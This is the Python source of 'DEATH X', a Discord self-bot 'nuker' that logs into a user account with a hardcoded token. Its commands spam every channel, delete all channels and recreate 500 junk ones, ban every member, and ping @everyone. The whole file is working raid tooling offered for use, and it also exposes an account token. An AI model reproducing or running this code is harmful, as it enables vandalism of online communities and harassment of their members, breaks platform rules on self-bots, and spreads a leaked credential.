import discord, colorama
from colorama import init, Fore
from discord.ext import commands

init(convert=True) #needed so that users using below versions of windows 10 can see the color such as windows xp vista7 ,8

print(f"""
▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██    ▒██   ██▒
▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒   ▒▒ █ █ ▒░
░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░   ░░  █   ░
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██     ░ █ █ ▒        {Fore.MAGENTA}v0.1{Fore.RESET}
░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓   ▒██▒ ▒██▒
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒   ▒▒ ░ ░▓ ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░   ░░   ░▒ ░
 ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░    ░    ░  
   ░       ░  ░     ░  ░         ░  ░  ░    ░    ░  
 ░                                                  
""")
print(f"""{Fore.GREEN}THE {Fore.RESET}{Fore.RED}DEATH X{Fore.RESET}{Fore.GREEN} SELFBOT NUKER
""")
print(f"{Fore.RED}This script is under MIT license and was originally made by jxd don't skid it")
print("")
print(f"{Fore.BLUE}")
print("       [?] Type {prefix}help to get all commands")

p = input("Prefix: ")
client = commands.Bot(command_prefix=p, self_bot=True, help_command=None)
token = "mfa.kw1oWrim81-gyXyCNUW9g60YrI3ak9zKB-dJ-Ecaqfy79BbwHVsnPAjATCV3vI2FpC5tO66U2WQHNE0RrV6f"

@client.event
async def on_ready():
 print("Logged in the user")

@client.command()
async def spam(ctx, amount: int, *, message):

    await ctx.message.delete()

    for _i in range(amount):

        await ctx.send(message)


@client.command()
async def spamall(ctx, num, *, message):

    await ctx.message.delete()

    num = int(num)

    for a in range(num):

        for channel in ctx.guild.channels:

            await channel.send(message)
    print("[+] Sent a message to a channel")

@client.command()
async def nuke(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0

    for c in ctx.guild.channels:

    	i = i + 1

    	await c.delete()

    	print(f"[-] channel deleted, {i} done")
	
    print("\n=======================")

    print("CREATING CHANELS...")

    print("=======================\n")

    for i in range(500):

    	guild = ctx.message.guild

    	await guild.create_text_channel("death x on top")

    	print(f"[+] channel created, {i} done")

@client.command()
async def clear(ctx):

    await ctx.message.delete()

    print("\n=======================")

    print("DELETING CHANELS...")

    print("=======================\n")

    i = 0
    for c in ctx.guild.channels:

    	i = i + 1

    	await c.delete()

    	print(f"[-] channel deleted, {i} done")

    print("Done !")

    await ctx.guild.create_text_channel("death x")
    print("Done clearing channels")
    await ctx.send("@everyone DEATH X ON TOP")

@client.command()
async def invite(ctx):
    await ctx.message.delete()

    await ctx.send("This selfbot will be released soon...")

@client.command()
async def banall(ctx):
    await ctx.message.delete()

    for member in ctx.guild.members:

     try:

       await member.ban()

       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)

     except:

       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)

@client.command
async def shutdown(ctx):
    await ctx.bot.logout()
    print(Fore.RED + "shutdowned the selfbot")

@client.command(pass_context=True)

async def help(ctx):

    await ctx.message.delete()

    author = ctx.message.author


    embed = discord.Embed(
        colour = discord.Colour.blue()
    )


    embed.set_author(name='<<DEATH X HELP MENU>>')

    embed.add_field(name='clear', value='Clears all channels', inline=False)
    embed.add_field(name='invite', value='Returns invite link of the selfbot', inline=False)

    embed.add_field(name='nuke', value='Nukes the server where the command is executed', inline=False)
    embed.add_field(name='spam <number> <message>', value='Spams on the channel wher eit is executed', inline=False)
    embed.add_field(name='spamall <number> <message>', value='The same as spam but you spam on all the channels in the server it was executed', inline=False)
    embed.add_field(name='banall', value='Bans all the members in the server where it was executed', inline=False)
    embed.add_field(name='shutdown', value='Shuts the selfbot down', inline=False)
    await ctx.send(author, embed=embed)
    await ctx.send("Coded by jxd#1385")

client.run(token, bot=False)